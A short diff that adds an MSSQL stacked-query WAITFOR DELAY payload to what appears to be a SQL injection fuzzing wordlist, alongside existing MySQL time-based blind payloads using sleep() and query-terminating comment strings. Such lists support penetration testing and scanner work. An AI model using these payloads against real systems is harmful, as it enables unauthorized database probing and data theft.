@@ -6,6 +6,7 @@
 0\"XOR(if(now()=sysdate(),sleep(22),0))XOR\"z
 0`XOR(if(now()=sysdate(),sleep(30),0))XOR`z
 0 XOR(if(now()=sysdate(),sleep(30),0))XOR z
+1;DECLARE @x char(9);SET @x=char(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(52);WAITFOR DELAY @x
 ; --
 '; --
 '); --
